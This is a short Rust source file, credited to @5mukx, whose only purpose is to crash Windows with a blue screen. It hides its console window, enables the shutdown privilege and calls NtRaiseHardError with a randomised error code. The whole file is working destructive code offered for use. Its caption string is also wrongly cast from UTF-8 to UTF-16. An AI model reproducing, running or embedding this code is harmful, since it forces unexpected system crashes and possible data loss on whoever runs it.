// BSOD Trigger
// Author: @5mukx

use std::ptr::null_mut;

use ntapi::{ntexapi::NtRaiseHardError, ntrtl::RtlAdjustPrivilege};
use winapi::{shared::{ntdef::{BOOLEAN, NTSTATUS}, ntstatus::STATUS_SUCCESS}, um::{processthreadsapi::{GetCurrentProcess, SetPriorityClass}, winbase::HIGH_PRIORITY_CLASS, wincon::GetConsoleWindow, winuser::{MessageBoxW, ShowWindow, MB_ICONEXCLAMATION, MB_OK, MB_SYSTEMMODAL, SW_HIDE}}};
use std::time::SystemTime;



pub fn start_bsod(){
    unsafe{
        // new way to hide the console !
        let console_window = GetConsoleWindow();

        ShowWindow(console_window, SW_HIDE);

        SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

        let mut error_ret = STATUS_SUCCESS;

        // enable shutdown privileges !
        let mut enabled:BOOLEAN = 0;
        let privilege = RtlAdjustPrivilege(19, 1 as BOOLEAN, 0 as BOOLEAN, &mut enabled);

        if privilege != STATUS_SUCCESS {
            error_ret = privilege;
            cleanup(error_ret);
            return;
        }

        // Trigger BSOD

        let mut u_resp: u32 = 0;
        let random = (SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs() as u32) & 0xF_FFFF;
        let bsod_code = 0xC000_0000 | ((random & 0xF00) << 8) | ((random & 0xF0) << 4) | (random & 0xF);

        let bsod = NtRaiseHardError(bsod_code as NTSTATUS, 0, 0, null_mut(), 6, &mut u_resp);

        if bsod != STATUS_SUCCESS{
            error_ret = bsod;
            cleanup(error_ret);
            return;
        }

        cleanup(error_ret);
    }
}



unsafe fn cleanup(error_ret: NTSTATUS){
    if error_ret != STATUS_SUCCESS{
        let message = format!("0x{:08X}", error_ret);
        let message_wide: Vec<u16> = message.encode_utf16().chain(Some(0)).collect();

        MessageBoxW(
            null_mut(),
                    message_wide.as_ptr(),
                    "Returned\0".as_ptr() as *const u16,
                    MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL,
        );
    }
}
